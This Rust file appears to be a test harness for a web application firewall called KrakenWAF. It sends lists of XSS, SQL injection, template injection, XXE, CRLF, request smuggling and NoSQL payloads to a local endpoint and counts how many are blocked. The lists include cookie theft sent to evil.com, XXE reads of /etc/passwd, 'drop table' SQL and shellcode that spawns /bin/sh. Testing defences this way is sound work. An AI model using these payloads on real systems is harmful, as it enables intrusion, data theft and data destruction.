//! KrakenWAF attack tool — sends XSS, SQLi and scanner-UA payloads to the WAF
//! and reports which were blocked and which bypassed.
//!
//! Usage
//! -----
//!   cargo run --bin attack                                     # target http://127.0.0.1:8080
//!   cargo run --bin attack -- --target http://... --verbose
//!   cargo run --bin attack -- --concurrency 50                 # 50 requests in-flight at once

use reqwest::StatusCode;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;
use tokio::task::JoinSet;

// ─── Payload lists ────────────────────────────────────────────────────────────

const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<script src=http://evil.com/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "<img/src=x onerror=alert(1)>",
    "\"/><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<img src=\"javascript:alert('xss')\">",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<button onclick=alert(1)>click</button>",
    "<div onmouseover=alert(1)>hover</div>",
    "<p onmouseenter=alert(1)>",
    "<table background=javascript:alert(1)>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1)//<</script>",
    "<script/src=data:,alert(1)>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>",
    "<script>alert`1`</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',999999)</script>",
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "<base href=javascript:alert(1)//>",
    "<bgsound src=javascript:alert(1)>",
    "<!--<img src=\"--><img src=x onerror=alert(1)//>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
];

const SQLI_PAYLOADS: &[&str] = &[
    "' or '1'='1",
    "' or '1'='1'--",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or ('1'='1",
    "') or ('1'='1'--",
    "' or 'x'='x",
    "1' or '1'='1",
    "1 or 1=1",
    "union select 1,2,3--",
    "union select null,null,null--",
    "union select @@version,null,null--",
    "' union select 1,2,3--",
    "' union select null,null--",
    "' union all select null--",
    "1; drop table users--",
    "1; select * from users--",
    "'; exec xp_cmdshell('dir')--",
    "'; exec master..xp_cmdshell('dir')--",
    "1 and 1=1",
    "1 and 1=2",
    "' and '1'='1",
    "' and 1=1--",
    "' and sleep(5)--",
    "1 and sleep(5)",
    "1; waitfor delay '0:0:5'--",
    "' waitfor delay '0:0:5'--",
    "1 and benchmark(5000000,md5(1))#",
    "' and (select * from (select(sleep(5)))a)--",
    "1' and extractvalue(1,concat(0x7e,(select version())))--",
    "' and updatexml(1,concat(0x7e,(select version())),1)--",
    "1 or (select 1 from dual where 1=1)--",
    "' or (select 1 from dual where 1=1)--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 2>1--",
    "' having 1=1--",
    "' group by 1--",
    "' order by 1--",
    "' order by 100--",
    "1; insert into users values('hack','hack')--",
    "1; update users set password='hack'--",
    "' or ''='",
    "' or 0=0--",
    "' or 0=0#",
    "\" or 0=0--",
    "\" or \"\"=\"",
    "' or true--",
];

const OVERFLOW_PAYLOADS: &[&str] = &[
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "1111111111111111111111111111111111111111",
    "%00%00%00%00%00%00%00%00%00%00%00%00",
    "%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff",
    "{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{",
    "))))))))))))))))))))))))))))))))))))))))",
    "../../../../../../../../../../../../etc/passwd",
    "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
    "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
    "id=12345678901234567890123456789012345678901234567890",
    r"\x90\x90\x90\x90\xcc",
    r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
    r"\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x6a\x3b\x58\x0f\x05",
    r"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68",
    "0x6a0x3b0x580x0f0x05",
];

const SSTI_PAYLOADS: &[&str] = &[
    "{{7*7}}",
    "{{= 7*7 }}",
    "${7*7}",
    "#{7*7}",
    "<%= 7 * 7 %>",
    "<% system('id') %>",
    "{% debug %}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "#set($x = 7 * 7)${x}",
    "[[${7*7}]]",
];

const SSI_PAYLOADS: &[&str] = &[
    "<!--#include file=\"/etc/passwd\" -->",
    "<!--#include virtual=\"/admin/config\" -->",
    "<!--#exec cmd=\"id\" -->",
    "<!--#echo var=\"DOCUMENT_ROOT\" -->",
    "<!--#printenv -->",
    "<!--#config errmsg=\"owned\" -->",
    "<!-- #exec cmd=\"/bin/sh -c id\" -->",
    "<!--# set var=\"x\" value=\"owned\" -->",
    "<!--#if expr=\"$QUERY_STRING\" -->",
    "%3C%21--%23exec%20cmd%3D%22id%22%20--%3E",
];

const ESI_PAYLOADS: &[&str] = &[
    "<esi:include src=\"http://attacker.test/poc\" />",
    "<esi:inline name=\"frag\">owned</esi:inline>",
    "<esi:debug/>",
    "<!--esi <esi:include src=\"http://attacker.test/x\" /> -->",
    "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
    "<esi:remove><script>alert(1)</script></esi:remove>",
    "<esi:choose><esi:when test=\"$(QUERY_STRING)\">x</esi:when></esi:choose>",
    "<esi:try><esi:attempt>x</esi:attempt><esi:except>y</esi:except></esi:try>",
    "<ESI:INCLUDE SRC=\"http://attacker.test/case\" />",
    "%3Cesi%3Ainclude%20src%3D%22http%3A%2F%2Fattacker.test%2Fencoded%22%20%2F%3E",
];

const CRLF_PAYLOADS: &[&str] = &[
    "%0d%0aSet-Cookie:admin=true",
    "%0aSet-Cookie:admin=true",
    "%0dSet-Cookie:admin=true",
    "%0d%0aLocation:http://evil.com",
    "%0d%0aHTTP/1.1%20200%20OK%0d%0a",
    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
    "%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
    "%250d%250aSet-Cookie:admin=true",
    "%25250d%25250aSet-Cookie:admin=true",
    "%u000d%u000aSet-Cookie:admin=true",
    r"\u000d\u000aSet-Cookie:admin=true",
    r"\r\nSet-Cookie:admin=true",
    "%E5%98%8A%E5%98%8DSet-Cookie:admin=true",
    "%C4%8D%C4%8ASet-Cookie:admin=true",
    "%e0%80%8d%e0%80%8aSet-Cookie:admin=true",
    "%00%0d%0aSet-Cookie:admin=true",
    "%0d%0a%20Set-Cookie:admin=true",
    "%0d%0a%09Set-Cookie:admin=true",
    "test%0d%0aX-Forwarded-Host:evil.com",
];

const REQUEST_SMUGGLING_PAYLOADS: &[&str] = &[
    "Transfer-Encoding: chunked",
    "transfer-encoding: chunked",
    "Transfer-Encoding:%20chunked",
    "Transfer-Encoding:%09chunked",
    "X-Session-Hijack: true",
    "x-session-hijack:%20true",
    "Content-Length: 0",
    "Content-Length: 4",
    "GET / HTTP/1.1%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
    "POST / HTTP/1.1%0d%0aContent-Length: 3%0d%0a%0d%0aabc",
];

const NOSQL_INJECTION_PAYLOADS: &[&str] = &[
    r#"{"user":{"$gt":""},"pass":"admin"}"#,
    r#"{"password":{"$ne":null},"$where":"this.password.match(/admin/)"}"#,
    r#"selector[$where]=this.password.match(/admin/)"#,
    r#"{"$or":[{"user":"admin"},{"pass":"root"}]}"#,
    r#"{"$and":[{"user":"admin"},{"pass":{"$exists":true}}]}"#,
    r#"{"$where":"sleep(5000) || true"}"#,
    r#"{"$nin":["admin","root"],"user":"undefined"}"#,
    r#"{"$in":["admin","user"],"success":true}"#,
    r#"{"$comment":"login admin pass"}"#,
    r#"db.stores.mapReduce(function(){return true},function(){})"#,
    r#"db.injection.insert({user:"admin",pass:null})"#,
    r#"{"$remove":"logins","admin":true}"#,
    r#"{"$save":{"user":"root"},"Date":"new%20Date()"}"#,
    r#"{"$where":"this.age==7 && user==admin"}"#,
    r#"{"$or":[{}], "token":"%00"}"#,
];

const XXE_ATTACK_PAYLOADS: &[&str] = &[
    r#"<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>"#,
    r#"<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY send SYSTEM "http://attacker.test/exfil">]><x>&send;</x>"#,
    r#"<!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/password">]><soap>&xxe;</soap>"#,
    r#"<xi:include href="file:///etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>"#,
    r#"<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/password"/></root>"#,
    r#"<!DOCTYPE data [<!ENTITY eval SYSTEM "php://filter/read=convert.base64-encode/resource=file">]>"#,
    r#"<!DOCTYPE xxe [<!ENTITY % exfil SYSTEM "http://attacker.test/evil.dtd">%exfil;]>"#,
    r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#,
    r#"<!DOCTYPE xxe [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><x>&file;</x>"#,
    r#"<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "gopher://127.0.0.1/send">]><x>&xxe;</x>"#,
    r#"<soap:Envelope><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></soap:Envelope>"#,
    r#"<!DOCTYPE xxe [<!ENTITY xxe "send exfil">]><x>&xxe;</x>"#,
    r#"<!ENTITY xxe SYSTEM "file:///etc/password">"#,
    r#"<root><xi:include href="http://attacker.test/xxe" xmlns:xi="urn:xi"/></root>"#,
    "%3C%00!%00D%00O%00C%00T%00Y%00P%00E%00%20%00x%00x%00e%00%20%00%5B%00%3C%00!%00E%00N%00T%00I%00T%00Y%00%20%00x%00x%00e%00%20%00S%00Y%00S%00T%00E%00M%00%20%00%22%00f%00i%00l%00e%00:%00/%00/%00/%00e%00t%00c%00/%00p%00a%00s%00s%00w%00d%00%22%00%3E%00%5D%00%3E%00",
];

const SCANNER_UAS: &[(&str, &str)] = &[
    ("nikto/2.1.6", "Nikto"),
    ("sqlmap/1.7", "sqlmap"),
    ("Nmap Scripting Engine", "Nmap"),
    ("masscan/1.3", "masscan"),
    ("nessus/10.0", "Nessus"),
    ("openvas/21.4", "OpenVAS"),
    ("gobuster/3.6", "gobuster"),
    ("dirbuster/1.0", "DirBuster"),
    ("arachni/1.5", "Arachni"),
    ("nuclei/2.9", "Nuclei"),
    ("wfuzz/3.1", "wfuzz"),
    ("commix/3.8", "commix"),
    ("Mozilla/5.0 (compatible; netsparker/6.0)", "Netsparker"),
    ("havij/1.17", "Havij"),
    ("Acunetix Web Vulnerability Scanner", "Acunetix"),
];

// ─── Result tracking ──────────────────────────────────────────────────────────

#[derive(Debug)]
enum Outcome {
    Blocked,
    Bypassed(StatusCode),
    Error(String),
}

struct SweepResult {
    label: String,
    outcome: Outcome,
}

// ─── CLI ──────────────────────────────────────────────────────────────────────

struct Config {
    target: String,
    verbose: bool,
    concurrency: usize,
}

fn parse_args() -> Config {
    let args: Vec<String> = std::env::args().collect();
    let mut target = "http://127.0.0.1:8080".to_string();
    let mut verbose = false;
    let mut concurrency = 20usize;
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--target" | "-t" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    target = v.clone();
                }
            }
            "--verbose" | "-v" => {
                verbose = true;
            }
            "--concurrency" | "-c" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    concurrency = v.parse().unwrap_or(20);
                }
            }
            _ => {}
        }
        i += 1;
    }
    Config {
        target,
        verbose,
        concurrency,
    }
}

// ─── Output helpers ───────────────────────────────────────────────────────────

fn outcome_icon(o: &Outcome) -> &'static str {
    match o {
        Outcome::Blocked => "[BLOCK]",
        Outcome::Bypassed(_) => "[PASS ]",
        Outcome::Error(_) => "[ERROR]",
    }
}

fn print_result(r: &SweepResult, verbose: bool) {
    match &r.outcome {
        Outcome::Blocked => {
            if verbose {
                println!("  {} {}", outcome_icon(&r.outcome), r.label);
            }
        }
        Outcome::Bypassed(code) => {
            println!(
                "  {} {} (status {})",
                outcome_icon(&r.outcome),
                r.label,
                code
            );
        }
        Outcome::Error(msg) => {
            println!("  {} {} — {}", outcome_icon(&r.outcome), r.label, msg);
        }
    }
}

fn tally(results: &[SweepResult], verbose: bool) -> (usize, usize, usize) {
    let (mut b, mut p, mut e) = (0, 0, 0);
    for r in results {
        match r.outcome {
            Outcome::Blocked => b += 1,
            Outcome::Bypassed(_) => p += 1,
            Outcome::Error(_) => e += 1,
        }
        print_result(r, verbose);
    }
    (b, p, e)
}

// ─── Concurrent sweep helpers ─────────────────────────────────────────────────
//
// Each sweep spawns one tokio task per payload. The Semaphore limits how many
// requests are actually in-flight simultaneously (--concurrency). Results are
// collected in original payload order so output is deterministic.

async fn sweep_post(
    client: &reqwest::Client,
    base: &str,
    path: &str,
    payloads: &[&str],
    concurrency: usize,
) -> Vec<SweepResult> {
    let url = Arc::new(format!("{base}{path}"));
    let sem = Arc::new(Semaphore::new(concurrency));
    let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();

    for (idx, &payload) in payloads.iter().enumerate() {
        let client = client.clone();
        let url = url.clone();
        let sem = sem.clone();
        let payload = payload.to_string();
        set.spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let outcome = match client
                .post(url.as_str())
                .form(&[("payload_test", &payload)])
                .send()
                .await
            {
                Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
                Ok(r) => Outcome::Bypassed(r.status()),
                Err(e) => Outcome::Error(e.to_string()),
            };
            (
                idx,
                SweepResult {
                    label: payload,
                    outcome,
                },
            )
        });
    }

    collect_ordered(&mut set, payloads.len()).await
}

async fn sweep_get(
    client: &reqwest::Client,
    base: &str,
    path: &str,
    payloads: &[&str],
    concurrency: usize,
) -> Vec<SweepResult> {
    let url = Arc::new(format!("{base}{path}"));
    let sem = Arc::new(Semaphore::new(concurrency));
    let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();

    for (idx, &payload) in payloads.iter().enumerate() {
        let client = client.clone();
        let url = url.clone();
        let sem = sem.clone();
        let payload = payload.to_string();
        set.spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let outcome = match client
                .get(url.as_str())
                .query(&[("payload_test", &payload)])
                .send()
                .await
            {
                Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
                Ok(r) => Outcome::Bypassed(r.status()),
                Err(e) => Outcome::Error(e.to_string()),
            };
            (
                idx,
                SweepResult {
                    label: payload,
                    outcome,
                },
            )
        });
    }

    collect_ordered(&mut set, payloads.len()).await
}

async fn sweep_ua(
    client: &reqwest::Client,
    base: &str,
    path: &str,
    concurrency: usize,
) -> Vec<SweepResult> {
    let url = Arc::new(format!("{base}{path}"));
    let sem = Arc::new(Semaphore::new(concurrency));
    let mut set: JoinSet<(usize, SweepResult)> = JoinSet::new();

    for (idx, &(ua, name)) in SCANNER_UAS.iter().enumerate() {
        let client = client.clone();
        let url = url.clone();
        let sem = sem.clone();
        let ua = ua.to_string();
        let label = format!("{name} ({ua})");
        set.spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let outcome = match client
                .get(url.as_str())
                .query(&[("payload_test", "hello")])
                .header("User-Agent", &ua)
                .send()
                .await
            {
                Ok(r) if r.status() == StatusCode::FORBIDDEN => Outcome::Blocked,
                Ok(r) => Outcome::Bypassed(r.status()),
                Err(e) => Outcome::Error(e.to_string()),
            };
            (idx, SweepResult { label, outcome })
        });
    }

    collect_ordered(&mut set, SCANNER_UAS.len()).await
}

// Drains a JoinSet and returns results sorted by original index.
async fn collect_ordered(set: &mut JoinSet<(usize, SweepResult)>, len: usize) -> Vec<SweepResult> {
    let mut indexed = Vec::with_capacity(len);
    while let Some(res) = set.join_next().await {
        if let Ok(item) = res {
            indexed.push(item);
        }
    }
    indexed.sort_by_key(|(i, _)| *i);
    indexed.into_iter().map(|(_, r)| r).collect()
}

// ─── Main ─────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    let cfg = parse_args();

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .expect("failed to build HTTP client");

    println!();
    println!("╔══════════════════════════════════════════════════════════╗");
    println!("║           KrakenWAF Attack Tool                         ║");
    println!("╚══════════════════════════════════════════════════════════╝");
    println!("  Target      : {}", cfg.target);
    println!("  Concurrency : {} requests in-flight", cfg.concurrency);
    println!("  Verbose     : {}", cfg.verbose);
    println!();

    let mut total_blocked = 0usize;
    let mut total_bypassed = 0usize;
    let mut total_errors = 0usize;

    macro_rules! run_sweep {
        ($label:expr, $fut:expr) => {{
            println!("━━━ {} ━━━", $label);
            let results = $fut.await;
            let (b, p, e) = tally(&results, cfg.verbose);
            total_blocked += b;
            total_bypassed += p;
            total_errors += e;
            println!("  → {b} blocked  |  {p} bypassed  |  {e} errors\n");
        }};
    }

    run_sweep!(
        format!("XSS — POST /test_post ({} payloads)", XSS_PAYLOADS.len()),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            XSS_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!("XSS — GET /test_get ({} payloads)", XSS_PAYLOADS.len()),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            XSS_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!("SQLi — GET /test_get ({} payloads)", SQLI_PAYLOADS.len()),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            SQLI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!("SQLi — POST /test_post ({} payloads)", SQLI_PAYLOADS.len()),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            SQLI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "Overflow DFA — GET /test_get ({} payloads)",
            OVERFLOW_PAYLOADS.len()
        ),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            OVERFLOW_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "Overflow DFA — POST /test_post ({} payloads)",
            OVERFLOW_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            OVERFLOW_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "SSTI DFA — GET /test_get ({} payloads)",
            SSTI_PAYLOADS.len()
        ),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            SSTI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "SSTI DFA — POST /test_post ({} payloads)",
            SSTI_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            SSTI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!("SSI DFA — GET /test_get ({} payloads)", SSI_PAYLOADS.len()),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            SSI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "SSI DFA — POST /test_post ({} payloads)",
            SSI_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            SSI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!("ESI DFA — GET /test_get ({} payloads)", ESI_PAYLOADS.len()),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            ESI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "ESI DFA — POST /test_post ({} payloads)",
            ESI_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            ESI_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "CRLF DFA — GET /test_get ({} payloads)",
            CRLF_PAYLOADS.len()
        ),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            CRLF_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "CRLF DFA — POST /test_post ({} payloads)",
            CRLF_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            CRLF_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "Request smuggling DFA — GET /test_get ({} payloads)",
            REQUEST_SMUGGLING_PAYLOADS.len()
        ),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            REQUEST_SMUGGLING_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "Request smuggling DFA — POST /test_post ({} payloads)",
            REQUEST_SMUGGLING_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            REQUEST_SMUGGLING_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "NoSQL injection DFA — GET /test_get ({} payloads)",
            NOSQL_INJECTION_PAYLOADS.len()
        ),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            NOSQL_INJECTION_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "NoSQL injection DFA — POST /test_post ({} payloads)",
            NOSQL_INJECTION_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            NOSQL_INJECTION_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "XXE attack DFA — GET /test_get ({} payloads)",
            XXE_ATTACK_PAYLOADS.len()
        ),
        sweep_get(
            &client,
            &cfg.target,
            "/test_get",
            XXE_ATTACK_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!(
            "XXE attack DFA — POST /test_post ({} payloads)",
            XXE_ATTACK_PAYLOADS.len()
        ),
        sweep_post(
            &client,
            &cfg.target,
            "/test_post",
            XXE_ATTACK_PAYLOADS,
            cfg.concurrency
        )
    );
    run_sweep!(
        format!("Scanner UA — GET /test_get ({} UAs)", SCANNER_UAS.len()),
        sweep_ua(&client, &cfg.target, "/test_get", cfg.concurrency)
    );

    let grand_total = total_blocked + total_bypassed + total_errors;
    println!("╔══════════════════════════════════════════════════════════╗");
    println!("║  SUMMARY                                                ║");
    println!("╠══════════════════════════════════════════════════════════╣");
    println!("║  Total requests : {grand_total:<38}║");
    println!("║  Concurrency    : {:<38}║", cfg.concurrency);
    println!("║  Blocked        : {total_blocked:<38}║");
    println!("║  Bypassed       : {total_bypassed:<38}║");
    println!("║  Errors         : {total_errors:<38}║");
    if total_bypassed == 0 && total_errors == 0 {
        println!("║  Status         : ALL PAYLOADS BLOCKED ✓               ║");
    } else if total_bypassed > 0 {
        println!(
            "║  Status         : !! {} PAYLOAD(S) BYPASSED WAF !!{:<7}║",
            total_bypassed, ""
        );
    }
    println!("╚══════════════════════════════════════════════════════════╝");
    println!();

    if total_bypassed > 0 {
        std::process::exit(1);
    }
}
